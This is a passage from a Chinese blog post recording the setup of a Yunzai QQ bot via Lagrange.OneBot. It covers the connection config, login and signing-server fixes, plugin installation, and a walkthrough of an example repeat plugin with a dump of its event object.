class="attr">&quot;ConsoleCompatibilityMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Implementations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ReverseWebSocket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">2536</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Suffix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/OneBotv11&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ReconnectInterval&quot;</span><span class="punctuation">:</span> <span class="number">5000</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;HeartBeatInterval&quot;</span><span class="punctuation">:</span> <span class="number">5000</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;AccessToken&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>其中<code>Lagrange.OneBot</code>在配置改完后按任意键继续时，会出现一个二维码。这时我们拿自己的qq小号(bot)扫码就可以登录进去了。之后我们在yunzai的主程序中就看到了连接建立</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125004337786.png"
                      class=""
                >
<p>但有时候登录时会显示需要Captcha认证，需要输入<code>ticket</code>和<code>token</code>，这时候我们需要到提供的网址处去手动验证，并抓包查看对应的<code>ticket</code>和<code>token</code>。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125142132940.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125142205096.png"
                      class=""
                >
<p>然后可以分别输入ticket和token。之后如果还是显示安全风险无法登录，可以在<code>appsettings.json</code>中加入<code>"SignServerUrl": "https://sign.lagrangecore.org/api/sign/25765"</code>这么一条配置，用来获取签名。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125141307897.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125141648698.png"
                      class=""
                >
<p>如果还是显示安全风险，可以到<a class="link" 
 href="https://lagrangedev.github.io/LagrangeGo/guide/sign" >签名服务器文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>中找一个别的签名服务器换上。实在不行，可以把当前目录下除了<code>Lagrange.OneBot.exe</code>和<code>appsettings.json</code>全部删除了重新启动。</p>
<h5 id="设置主人">设置主人</h5>
<p>之后我们发现<code>yunzai/plugins/example</code>中有个<code>主动复读.js</code>文件，里面实现的内容就是匹配到<code>#复读</code>就进行复读，可以用来进行测试。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125143521393.png"
                      class=""
                >
<p>然后就给bot私发#设置主人就能够获取权限。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125144021413.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125144452592.png"
                      class=""
                >
<p>当然也可以直接改<code>yunzai/config/config/other.yaml</code>中的masterQQ以及master进行配置。其中master的格式是</p>
<p><code>bot qq:master qq</code>。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125144941477.png"
                      class=""
                >
<h4 id="插件安装">插件安装</h4>
<p><a class="link" 
 href="https://gitee.com/yhArcadia/Yunzai-Bot-plugins-index" >插件大全<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>插件里提供了各式不同类型的功能，在yunzai
bot运行时，会自动加载<code>yunzai/plugins</code>目录下的各个插件目录。</p>
<p>新的插件可以自己进行编写，存在插件目录下，也可以github和gitee上找新插件下载，大体有以下几种方式进行安装。</p>
<h5 id="自带指令">自带指令</h5>
<p>一般能装一些最常用的插件</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">#安装TRSS-Plugin</span><br></pre></td></tr></table></figure></div>
<h5 id="curl">curl</h5>
<p>可以方便下载gitee上一些插件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -o &quot;./plugins/example/定时群发.js&quot; &quot;https://gitee.com/batvbs/Miao-Yunzai-batvbs/raw/master/定时群发.js&quot;</span><br></pre></td></tr></table></figure></div>
<h4 id="基础功能测试及编写">基础功能测试及编写</h4>
<p>以<code>./plugin/example</code>目录下的<code>主动复读.js</code>为例</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">example2</span> <span class="keyword">extends</span> <span class="title class_ inherited__">plugin</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(&#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;复读&quot;</span>,</span><br><span class="line">      <span class="attr">dsc</span>: <span class="string">&quot;复读用户发送的内容，然后撤回&quot;</span>,</span><br><span class="line">      <span class="comment">/** https://oicqjs.github.io/oicq/#events */</span></span><br><span class="line">      <span class="attr">event</span>: <span class="string">&quot;message&quot;</span>,</span><br><span class="line">      <span class="attr">priority</span>: <span class="number">5000</span>,</span><br><span class="line">      <span class="attr">rule</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/** 命令正则匹配 */</span></span><br><span class="line">          <span class="attr">reg</span>: <span class="string">&quot;^#复读$&quot;</span>,</span><br><span class="line">          <span class="comment">/** 执行方法 */</span></span><br><span class="line">          <span class="attr">fnc</span>: <span class="string">&quot;repeat&quot;</span>,</span><br><span class="line">          <span class="attr">permission</span>: <span class="string">&quot;master&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 复读 */</span></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">repeat</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** 设置上下文，后续接收到内容会执行doRep方法 */</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setContext</span>(<span class="string">&quot;doRep&quot;</span>)</span><br><span class="line">    <span class="comment">/** 回复 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">reply</span>(<span class="string">&quot;请发送要复读的内容&quot;</span>, <span class="literal">false</span>, &#123; <span class="attr">at</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 接受内容 */</span></span><br><span class="line">  <span class="title function_">doRep</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** 结束上下文 */</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">finish</span>(<span class="string">&quot;doRep&quot;</span>)</span><br><span class="line">    <span class="comment">/** 复读内容 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">reply</span>(<span class="variable language_">this</span>.<span class="property">e</span>.<span class="property">message</span>, <span class="literal">false</span>, &#123; <span class="attr">recallMsg</span>: <span class="number">5</span> &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>首先是继承了plugin父类。各个参数的含义见注释。</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">plugin</span> &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> name 插件名称</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> dsc 插件描述</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> handler handler配置</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> handler.key handler支持的事件key</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> handler.fn handler的处理func</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> namespace namespace，设置handler时建议设置</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> event 执行事件，默认message</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> priority 优先级，数字越小优先级越高</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">rule</span></span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.reg 命令正则</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.fnc 命令执行方法</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.event 执行事件，默认message</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.log  false时不显示执行日志</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.permission 权限 master,owner,admin,all</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">task</span></span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> task.name 定时任务名称</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> task.cron 定时任务cron表达式</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> task.fnc 定时任务方法名</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> task.log  false时不显示执行日志</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">&#123;</span></span><br><span class="line"><span class="params">    name = <span class="string">&quot;your-plugin&quot;</span>,</span></span><br><span class="line"><span class="params">    dsc = <span class="string">&quot;无&quot;</span>,</span></span><br><span class="line"><span class="params">    handler,</span></span><br><span class="line"><span class="params">    namespace,</span></span><br><span class="line"><span class="params">    event = <span class="string">&quot;message&quot;</span>,</span></span><br><span class="line"><span class="params">    priority = <span class="number">5000</span>,</span></span><br><span class="line"><span class="params">    task = &#123; name: <span class="string">&quot;&quot;</span>, fnc: <span class="string">&quot;&quot;</span>, cron: <span class="string">&quot;&quot;</span> &#125;,</span></span><br><span class="line"><span class="params">    rule = []</span></span><br><span class="line"><span class="params">  &#125;</span>)</span><br><span class="line">  ........</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> msg 发送的消息</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> quote 是否引用回复</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> data.recallMsg 群聊是否撤回消息，0-120秒，0不撤回</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> data.at 是否at用户</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="title function_">reply</span>(<span class="params">msg = <span class="string">&quot;&quot;</span>, quote = <span class="literal">false</span>, data = &#123;&#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">e</span>?.<span class="property">reply</span> || !msg) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">e</span>.<span class="title function_">reply</span>(msg, quote, data)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<p>然后会调用自定义实现的func函数，在setcontext之后，后续收到的消息会将程序执行流转到另一个自定义的函数doRep。最终bot实际发送消息是用<code>this.reply</code>这个接口实现的，在父类中看，调用了e对象中的reply。</p>
<h5 id="e对象结构">e对象结构</h5>
<p>我们要想稍微深入一点理解执行过程，就首先得知道<code>this.e</code>是个什么对象。我们可以加一个console.log来在日志中记录这个e的具体结构。加上之后给bot发<code>#复读</code>看看结构。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125230821783.png"
                      class=""
                >
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line">&lt;ref *<span class="number">1</span>&gt; <span class="punctuation">&#123;</span></span><br><span class="line">  message_type<span class="punctuation">:</span> &#x27;group&#x27;<span class="punctuation">,</span></span><br><span class="line">  sub_type<span class="punctuation">:</span> &#x27;normal&#x27;<span class="punctuation">,</span></span><br><span class="line">  message_id<span class="punctuation">:</span> <span class="number">32652067</span><span class="punctuation">,</span></span><br><span class="line">  group_id<span class="punctuation">:</span> <span class="number">1003519385</span><span class="punctuation">,</span></span><br><span class="line">  user_id<span class="punctuation">:</span> <span class="number">2583727188</span><span class="punctuation">,</span></span><br><span class="line">  anonymous<span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">  message<span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">&#123;</span> text<span class="punctuation">:</span> &#x27;#复读&#x27;<span class="punctuation">,</span> type<span class="punctuation">:</span> &#x27;text&#x27; <span class="punctuation">&#125;</span> <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  raw_message<span class="punctuation">:</span> &#x27;#复读&#x27;<span class="punctuation">,</span></span><br><span class="line">  font<span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  sender<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    user_id<span class="punctuation">:</span> <span class="number">2583727188</span><span class="punctuation">,</span></span><br><span class="line">    nickname<span class="punctuation">:</span> &#x27;collectcrop&#x27;<span class="punctuation">,</span></span><br><span class="line">    card<span class="punctuation">:</span> &#x27;collectcrop&#x27;<span class="punctuation">,</span></span><br><span class="line">    sex<span class="punctuation">:</span> &#x27;unknown&#x27;<span class="punctuation">,</span></span><br><span class="line">    age<span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    area<span class="punctuation">:</span> &#x27;&#x27;<span class="punctuation">,</span></span><br><span class="line">    level<span class="punctuation">:</span> &#x27;<span class="number">2</span>&#x27;<span class="punctuation">,</span></span><br><span class="line">    role<span class="punctuation">:</span> &#x27;owner&#x27;<span class="punctuation">,</span></span><br><span class="line">    title<span class="punctuation">:</span> &#x27;&#x27;</span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  time<span class="punctuation">:</span> <span class="number">1732547237</span><span class="punctuation">,</span></span><br><span class="line">  self_id<span class="punctuation">:</span> <span class="number">3832600704</span><span class="punctuation">,</span></span><br><span class="line">  post_type<span class="punctuation">:</span> &#x27;message&#x27;<span class="punctuation">,</span></span><br><span class="line">  raw<span class="punctuation">:</span> &#x27;<span class="punctuation">&#123;</span><span class="attr">&quot;message_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;group&quot;</span><span class="punctuation">,</span><span class="attr">&quot;sub_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;normal&quot;</span><span class="punctuation">,</span><span class="attr">&quot;message_id&quot;</span><span class="punctuation">:</span><span class="number">32652067</span><span class="punctuation">,</span><span class="attr">&quot;group_id&quot;</span><span class="punctuation">:</span><span class="number">1003519385</span><span class="punctuation">,</span><span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span><span class="number">2583727188</span><span class="punctuation">,</span><span class="attr">&quot;anonymous&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;text&quot;</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;text&quot;</span><span class="punctuation">:</span><span class="string">&quot;#\\u590D\\u8BFB&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;raw_message&quot;</span><span class="punctuation">:</span><span class="string">&quot;#\\u590D\\u8BFB&quot;</span><span class="punctuation">,</span><span class="attr">&quot;font&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;sender&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span><span class="number">2583727188</span><span class="punctuation">,</span><span class="attr">&quot;nickname&quot;</span><span class="punctuation">:</span><span class="string">&quot;collectcrop&quot;</span><span class="punctuation">,</span><span class="attr">&quot;card&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="string">&quot;unknown&quot;</span><span class="punctuation">,</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;area&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;level&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;owner&quot;</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;time&quot;</span><span class="punctuation">:</span><span class="number">1732547237</span><span class="punctuation">,</span><span class="attr">&quot;self_id&quot;</span><span class="punctuation">:</span><span class="number">3832600704</span><span class="punctuation">,</span><span class="attr">&quot;post_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;message&quot;</span><span class="punctuation">&#125;</span>&#x27;<span class="punctuation">,</span></span><br><span class="line">  bot<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    adapter<span class="punctuation">:</span> OneBotv11Adapter <span class="punctuation">&#123;</span></span><br><span class="line">      id<span class="punctuation">:</span> &#x27;QQ&#x27;<span class="punctuation">,</span></span><br><span class="line">      name<span class="punctuation">:</span> &#x27;OneBotv11&#x27;<span class="punctuation">,</span></span><br><span class="line">      path<span class="punctuation">:</span> &#x27;OneBotv11&#x27;<span class="punctuation">,</span></span><br><span class="line">      echo<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      timeout<span class="punctuation">:</span> <span class="number">60000</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    ws<span class="punctuation">:</span> WebSocket <span class="punctuation">&#123;</span></span><br><span class="line">      _events<span class="punctuation">:</span> <span class="punctuation">[</span>Object<span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span> prototype<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      _eventsCount<span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span></span><br><span class="line">      _maxListeners<span class="punctuation">:</span> undefined<span class="punctuation">,</span></span><br><span class="line">      _binaryType<span class="punctuation">:</span> &#x27;nodebuffer&#x27;<span class="punctuation">,</span></span><br><span class="line">      _closeCode<span class="punctuation">:</span> <span class="number">1006</span><span class="punctuation">,</span></span><br><span class="line">      _closeFrameReceived<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      _closeFrameSent<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      _closeMessage<span class="punctuation">:</span> &lt;Buffer &gt;<span class="punctuation">,</span></span><br><span class="line">      _closeTimer<span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      _errorEmitted<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      _extensions<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      _paused<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      _protocol<span class="punctuation">:</span> &#x27;&#x27;<span class="punctuation">,</span></span><br><span class="line">      _readyState<span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      _receiver<span class="punctuation">:</span> <span class="punctuation">[</span>Receiver<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      _sender<span class="punctuation">:</span> <span class="punctuation">[</span>Sender<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      _socket<span class="punctuation">:</span> <span class="punctuation">[</span>Socket<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      _autoPong<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      _isServer<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      rid<span class="punctuation">:</span> &#x27;<span class="punctuation">:</span><span class="punctuation">:</span>ffff<span class="punctuation">:</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="punctuation">:</span><span class="number">52599</span>-dldWBbcOj0mF9sQR9Mpc6g==&#x27;<span class="punctuation">,</span></span><br><span class="line">      sid<span class="punctuation">:</span> &#x27;ws<span class="punctuation">:</span><span class="comment">//127.0.0.1:2536/OneBotv11&#x27;,</span></span><br><span class="line">      sendMsg<span class="punctuation">:</span> <span class="punctuation">[</span>Function (anonymous)<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">[</span>Symbol(shapeMode)<span class="punctuation">]</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">[</span>Symbol(kCapture)<span class="punctuation">]</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    sendApi<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> sendApi<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    stat<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      start_time<span class="punctuation">:</span> <span class="number">1732545494</span><span class="punctuation">,</span></span><br><span class="line">      stat<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      lost_pkt_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      lost_times<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      recv_msg_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      recv_pkt_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      sent_msg_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      sent_pkt_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      app_initialized<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      app_enabled<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      app_good<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      online<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      good<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    model<span class="punctuation">:</span> &#x27;TRSS Yunzai &#x27;<span class="punctuation">,</span></span><br><span class="line">    info<span class="punctuation">:</span> <span class="punctuation">&#123;</span> user_id<span class="punctuation">:</span> <span class="number">3832600704</span><span class="punctuation">,</span> nickname<span class="punctuation">:</span> &#x27;testbot&#x27; <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    uin<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    nickname<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    avatar<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setProfile<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setProfile<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setNickname<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setNickname<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setAvatar<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setAvatar<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    pickFriend<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> pickFriend<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    pickUser<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getFriendArray<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getFriendArray<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getFriendList<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getFriendList<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getFriendMap<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getFriendMap<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    fl<span class="punctuation">:</span> Map(<span class="number">3</span>) <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="number">66600000</span> =&gt; <span class="punctuation">[</span>Object<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="number">2583727188</span> =&gt; <span class="punctuation">[</span>Object<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="number">3832600704</span> =&gt; <span class="punctuation">[</span>Object<span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    pickMember<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> pickMember<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    pickGroup<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> pickGroup<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getGroupArray<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getGroupArray<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getGroupList<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getGroupList<span class="punctuation">]</span><span 